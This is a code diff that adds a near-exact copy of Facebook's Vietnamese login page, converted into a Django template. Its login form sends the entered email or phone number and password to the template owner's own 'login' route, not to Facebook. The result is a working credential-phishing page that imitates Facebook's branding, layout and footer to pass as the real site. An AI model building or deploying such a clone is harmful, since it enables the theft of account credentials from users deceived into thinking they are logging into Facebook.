@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="vi" id="facebook" class="no_js">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="referrer"
+      content="origin-when-crossorigin"
+      id="meta_referrer"
+    />
+
+    <link
+      rel="manifest"
+      id="MANIFEST_LINK"
+      href="/data/manifest/"
+      crossorigin="use-credentials"
+    />
+    <title id="pageTitle">Facebook - Đăng nhập hoặc đăng ký</title>
+    <meta property="og:site_name" content="Facebook" />
+    <meta property="og:url" content="https://vi-vn.facebook.com/" />
+    <meta
+      property="og:image"
+      content="https://www.facebook.com/images/fb_icon_325x325.png"
+    />
+    <meta property="og:locale" content="vi_VN" />
+    <link
+      rel="alternate"
+      media="only screen and (max-width: 640px)"
+      href="https://m.facebook.com/"
+    />
+    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
+    <meta
+      name="description"
+      content="H&#xe3;y &#x111;&#x103;ng nh&#x1ead;p Facebook &#x111;&#x1ec3; b&#x1eaf;t &#x111;&#x1ea7;u chia s&#x1ebb; v&#xe0; k&#x1ebf;t n&#x1ed1;i v&#x1edb;i b&#x1ea1;n b&#xe8;, gia &#x111;&#xec;nh v&#xe0; nh&#x1eef;ng ng&#x1b0;&#x1edd;i b&#x1ea1;n bi&#x1ebf;t."
+    />
+    <link rel="canonical" href="https://vi-vn.facebook.com/" />
+    <link
+      rel="shortcut icon"
+      href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/l/0,cross/pYrjM7I1_Bh.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="/uaktyf"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/QiKRZkWgICZ.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="xPmM+QC"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/RspwE1UYLwr.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="Pud6B2Z"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/KcASO03lAhI.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="JIcZqNd"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/qGdP5mQHk9S.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="Ug0aIg0"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/uaRUZk18yNI.css?_nc_x=Ij3Wp8lg5Kz"
+      data-bootloader-hash="Yo2UzOh"
+      crossorigin="anonymous"
+    />
+    
+  </head>
+  <body
+    class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_vi_VN"
+    dir="ltr"
+  >
+    <div class="_li" id="u_0_1_tc">
+      <div id="globalContainer" class="uiContextualLayerParent">
+        <div class="fb_content clearfix" id="content" role="main">
+          <div>
+            <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
+              <div class="_8esk">
+                <div class="_8esl">
+                  <div class="_8ice">
+                    <img
+                      class="fb_logo _8ilh img"
+                      src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+                      alt="Facebook"
+                    />
+                  </div>
+                  <h2 class="_8eso">
+                    Facebook giúp bạn kết nối và chia sẻ với mọi người trong
+                    cuộc sống của bạn.
+                  </h2>
+                </div>
+                <div class="_8esn">
+                  <div class="_8iep _8icy _9ahz _9ah-">
+                    <div class="_6luv _52jv">
+                      <form
+                        class="_9vtf"
+                        data-testid="royal_login_form"
+                        action="{% url 'login' %}"
+                        method="post"
+                        onsubmit=""
+                        id="u_0_2_3M"
+                      >
+                      {% csrf_token %}
+                        <input
+                          type="hidden"
+                          name="jazoest"
+                          value="21009"
+                          autocomplete="off"
+                        /><input
+                          type="hidden"
+                          name="lsd"
+                          value="AVo5WtekPrY"
+                          autocomplete="off"
+                        />
+                        <div>
+                          <div class="_6lux">
+                            <input
+                              type="text"
+                              class="inputtext _55r1 _6luy"
+                              name="username"
+                              
+                              
+                              placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i"
+                              autofocus="1"
+                              aria-label="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i"
+                            />
+                          </div>
+                          <div class="_6lux">
+                            <div class="_6luy _55r1 _1kbt" id="passContainer">
+                              <input
+                                type="password"
+                                class="inputtext _55r1 _6luy _9npi"
+                                name="password"
+                                id="pass"
+                                data-testid="royal_pass"
+                                placeholder="M&#x1ead;t kh&#x1ea9;u"
+                                aria-label="M&#x1ead;t kh&#x1ea9;u"
+                              />
+                              <div class="_9ls7" id="u_0_3_uz">
+                                <a href="#" role="button"
+                                  ><div class="_9lsa">
+                                    <div class="_9lsb" id="u_0_4_1n"></div></div
+                                ></a>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <input
+                          type="hidden"
+                          autocomplete="off"
+                          name="login_source"
+                          value="comet_headerless_login"
+                        /><input
+                          type="hidden"
+                          autocomplete="off"
+                          name="next"
+                          value=""
+                        />
+                        <div class="_6ltg">
+                          <button
+                            value="1"
+                            class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
+                            name="login"
+                            data-testid="royal_login_button"
+                            type="submit"
+                            id="u_0_5_1s"
+                          >
+                            Đăng nhập
+                          </button>
+                        </div>
+                        <div class="_6ltj">
+                          <a
+                            href="https://vi-vn.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjcyNTQwMDYwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login"
+                            >Quên mật khẩu?</a
+                          >
+                        </div>
+                        <div class="_8icz"></div>
+                        <div class="_6ltg">
+                          <a
+                            role="button"
+                            class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
+                            href="https://www.facebook.com/r.php"
+                            ajaxify="/reg/spotlight/"
+                            id="u_0_0_xY"
+                            rel="async"
+                            >Tạo tài khoản mới</a
+                          >
+                        </div>
+                      </form>
+                    </div>
+                    <div id="reg_pages_msg" class="_58mk">
+                      <a
+                        href="/pages/create/?ref_type=registration_form"
+                        class="_8esh"
+                        >Tạo Trang</a
+                      >
+                      dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="">
+          <div class="_95ke _8opy">
+            <div
+              id="pageFooter"
+              data-referrer="page_footer"
+              data-testid="page_footer"
+            >
+              <ul
+                class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
+                data-nocookies="1"
+              >
+                <li>Tiếng Việt</li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://en-gb.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("en_GB", "vi_VN", "https:\/\/en-gb.facebook.com\/", "www_list_selector", 0); return false;'
+                    title="English (UK)"
+                    >English (UK)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://zh-tw.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("zh_TW", "vi_VN", "https:\/\/zh-tw.facebook.com\/", "www_list_selector", 1); return false;'
+                    title="Traditional Chinese (Taiwan)"
+                    >中文(台灣)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://ko-kr.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("ko_KR", "vi_VN", "https:\/\/ko-kr.facebook.com\/", "www_list_selector", 2); return false;'
+                    title="Korean"
+                    >한국어</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://ja-jp.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("ja_JP", "vi_VN", "https:\/\/ja-jp.facebook.com\/", "www_list_selector", 3); return false;'
+                    title="Japanese"
+                    >日本語</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://fr-fr.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("fr_FR", "vi_VN", "https:\/\/fr-fr.facebook.com\/", "www_list_selector", 4); return false;'
+                    title="French (France)"
+                    >Français (France)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://th-th.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("th_TH", "vi_VN", "https:\/\/th-th.facebook.com\/", "www_list_selector", 5); return false;'
+                    title="Thai"
+                    >ภาษาไทย</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://es-la.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("es_LA", "vi_VN", "https:\/\/es-la.facebook.com\/", "www_list_selector", 6); return false;'
+                    title="Spanish"
+                    >Español</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://pt-br.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("pt_BR", "vi_VN", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 7); return false;'
+                    title="Portuguese (Brazil)"
+                    >Português (Brasil)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://de-de.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("de_DE", "vi_VN", "https:\/\/de-de.facebook.com\/", "www_list_selector", 8); return false;'
+                    title="German"
+                    >Deutsch</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://it-it.facebook.com/"
+                    onclick='require("IntlUtils").setCookieLocale("it_IT", "vi_VN", "https:\/\/it-it.facebook.com\/", "www_list_selector", 9); return false;'
+                    title="Italian"
+                    >Italiano</a
+                  >
+                </li>
+                <li>
+                  <a
+                    role="button"
+                    class="_42ft _4jy0 _517i _517h _51sy"
+                    rel="dialog"
+                    ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
+                    href="#"
+                    title="Hi&#x1ec3;n th&#x1ecb; th&#xea;m ng&#xf4;n ng&#x1eef;"
+                    ><i class="img sp_h4Swrc8tiWJ sx_8ed39e"></i
+                  ></a>
+                </li>
+              </ul>
+              <div id="contentCurve"></div>
+              <div
+                id="pageFooterChildren"
+                role="contentinfo"
+                aria-label="Li&#xea;n k&#x1ebf;t trang web Facebook"
+              >
+                <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                  <li>
+                    <a href="/reg/" title="&#x110;&#x103;ng k&#xfd; Facebook"
+                      >Đăng ký</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/login/"
+                      title="&#x110;&#x103;ng nh&#x1ead;p Facebook"
+                      >Đăng nhập</a
+                    >
+                  </li>
+                  <li>
+                    <a href="https://messenger.com/" title="Xem Messenger."
+                      >Messenger</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/lite/"
+                      title="Facebook Lite d&#xe0;nh cho Android."
+                      >Facebook Lite</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://vi-vn.facebook.com/watch/"
+                      title="L&#x1b0;&#x1edb;t xem video c&#x1ee7;a ch&#xfa;ng t&#xf4;i tr&#xea;n tab Watch."
+                      >Watch</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/places/"
+                      title="Xem nh&#x1eef;ng &#x111;&#x1ecb;a &#x111;i&#x1ec3;m n&#x1ed5;i ti&#x1ebf;ng tr&#xea;n Facebook."
+                      >Địa điểm</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/games/"
+                      title="Xem tr&#xf2; ch&#x1a1;i tr&#xea;n Facebook."
+                      >Trò chơi</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/marketplace/"
+                      title="Mua b&#xe1;n tr&#xea;n Facebook Marketplace."
+                      >Marketplace</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://pay.facebook.com/"
+                      title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Meta Pay"
+                      target="_blank"
+                      >Meta Pay</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.oculus.com/"
+                      title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Oculus"
+                      target="_blank"
+                      >Oculus</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://portal.facebook.com/"
+                      title="T&#xec;m hi&#x1ec3;u th&#xea;m v&#x1ec1; Facebook Portal"
+                      target="_blank"
+                      >Portal</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3BIWHsjk2bukrgOBHj9CsBMVLAR441TIR7lJqnOgpElAr3q-fAERzDJvIr_9iYZ_XYSEUbHyymX0YJEhBl-JnARP_eVfYirku9yoZk9x_eRGhW9q1ClcRBCQlai0onD7JdgKn_hkeXWbkd08Ge4w"
+                      title="H&#xe3;y xem Instagram"
+                      target="_blank"
+                      rel="noopener nofollow"
+                      data-lynx-mode="asynclazy"
+                      >Instagram</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.bulletin.com/"
+                      title="Xem b&#x1ea3;n tin tr&#xea;n Bulletin"
+                      >Bulletin</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/fundraisers/"
+                      title="Quy&#xea;n g&#xf3;p cho c&#xe1;c m&#x1ee5;c &#x111;&#xed;ch c&#xf3; &#xfd; ngh&#x129;a."
+                      >Chiến dịch gây quỹ</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/biz/directory/"
+                      title="L&#x1b0;&#x1edb;t xem th&#x1b0; m&#x1ee5;c D&#x1ecb;ch v&#x1ee5; Facebook c&#x1ee7;a ch&#xfa;ng t&#xf4;i."
+                      >Dịch vụ</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
+                      title="Xem Trung t&#xe2;m th&#xf4;ng tin b&#x1ecf; phi&#x1ebf;u."
+                      >Trung tâm thông tin bỏ phiếu</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/privacy/policy/?entry_point=facebook_page_footer"
+                      title="T&#xec;m hi&#x1ec3;u c&#xe1;ch ch&#xfa;ng t&#xf4;i thu th&#x1ead;p, s&#x1eed; d&#x1ee5;ng v&#xe0; chia s&#x1ebb; th&#xf4;ng tin &#x111;&#x1ec3; h&#x1ed7; tr&#x1ee3; Facebook."
+                      >Chính sách quyền riêng tư</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/privacy/center/?entry_point=facebook_page_footer"
+                      title="T&#xec;m hi&#x1ec3;u c&#xe1;ch qu&#x1ea3;n l&#xfd; v&#xe0; ki&#x1ec3;m so&#xe1;t quy&#x1ec1;n ri&#xea;ng t&#x1b0; tr&#xea;n Facebook."
+                      >Trung tâm quyền riêng tư</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/groups/explore/"
+                      title="Kh&#xe1;m ph&#xe1; nh&#xf3;m."
+                      >Nhóm</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://about.meta.com/"
+                      accesskey="8"
+                      title="&#x110;&#x1ecd;c blog c&#x1ee7;a ch&#xfa;ng t&#xf4;i, kh&#xe1;m ph&#xe1; trung t&#xe2;m t&#xe0;i nguy&#xea;n v&#xe0; t&#xec;m c&#x1a1; h&#x1ed9;i vi&#x1ec7;c l&#xe0;m."
+                      >Giới thiệu</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
+                      title="Qu&#x1ea3;ng c&#xe1;o tr&#xea;n Facebook."
+                      >Tạo quảng cáo</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/pages/create/?ref_type=site_footer"
+                      title="T&#x1ea1;o Trang"
+                      >Tạo Trang</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://developers.facebook.com/?ref=pf"
+                      title="Pha&#x301;t tri&#xea;&#x309;n tr&#xea;n n&#xea;&#x300;n ta&#x309;ng cu&#x309;a chu&#x301;ng t&#xf4;i."
+                      >Nhà phát triển</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/careers/?ref=pf"
+                      title="T&#x1ea1;o b&#x1b0;&#x1edb;c ngo&#x1eb7;t m&#x1edb;i trong s&#x1ef1; nghi&#x1ec7;p c&#x1ee7;a b&#x1ea1;n v&#x1edb;i c&#xf4;ng ty tuy&#x1ec7;t v&#x1edd;i c&#x1ee7;a ch&#xfa;ng t&#xf4;i"
+                      >Tuyển dụng</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/policies/cookies/"
+                      title="T&#xec;m hi&#x1ec3;u v&#x1ec1; cookie v&#xe0; Facebook."
+                      data-nocookies="1"
+                      >Cookie</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      class="_41ug"
+                      data-nocookies="1"
+                      href="https://www.facebook.com/help/568137493302217"
+                      title="T&#xec;m hi&#x1ec3;u v&#x1ec1; L&#x1ef1;a ch&#x1ecd;n qu&#x1ea3;ng c&#xe1;o."
+                      >Lựa chọn quảng cáo<i
+                        class="img sp_h4Swrc8tiWJ sx_22044a"
+                      ></i
+                    ></a>
+                  </li>
+                  <li>
+                    <a
+                      data-nocookies="1"
+                      href="/policies?ref=pf"
+                      accesskey="9"
+                      title="Xem l&#x1ea1;i &#x111;i&#x1ec1;u kho&#x1ea3;n v&#xe0; ch&#xed;nh s&#xe1;ch c&#x1ee7;a ch&#xfa;ng t&#xf4;i."
+                      >Điều khoản</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/help/?ref=pf"
+                      accesskey="0"
+                      title="Truy c&#x1ead;p Trung t&#xe2;m tr&#x1ee3; gi&#xfa;p c&#x1ee7;a ch&#xfa;ng t&#xf4;i."
+                      >Trợ giúp</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="help/637205020878504"
+                      title="Xem Th&#xf4;ng b&#xe1;o T&#x1ea3;i th&#xf4;ng tin li&#xea;n h&#x1ec7; l&#xea;n &amp; &#x111;&#x1ed1;i t&#x1b0;&#x1ee3;ng kh&#xf4;ng ph&#x1ea3;i ng&#x1b0;&#x1edd;i d&#xf9;ng."
+                      >Tải thông tin liên hệ lên &amp; đối tượng không phải
+                      người dùng</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      accesskey="6"
+                      class="accessible_elem"
+                      href="/settings"
+                      title="Xem v&#xe0; ch&#x1ec9;nh s&#x1eed;a c&#xe0;i &#x111;&#x1eb7;t Facebook."
+                      >Cài đặt</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      accesskey="7"
+                      class="accessible_elem"
+                      href="/allactivity?privacy_source=activity_log_top_menu"
+                      title="Xem nh&#x1ead;t k&#xfd; ho&#x1ea1;t &#x111;&#x1ed9;ng"
+                      >Nhật ký hoạt động</a
+                    >
+                  </li>
+                </ul>
+              </div>
+              <div class="mvl copyright">
+                <div><span> Meta © 2022</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div></div>
+      <span
+        ><img
+          src="https://facebook.com/security/hsts-pixel.gif"
+          width="0"
+          height="0"
+          style="display: none"
+      /></span>
+    </div>
+    <div style="display: none"></div>
+  </body>
+</html>
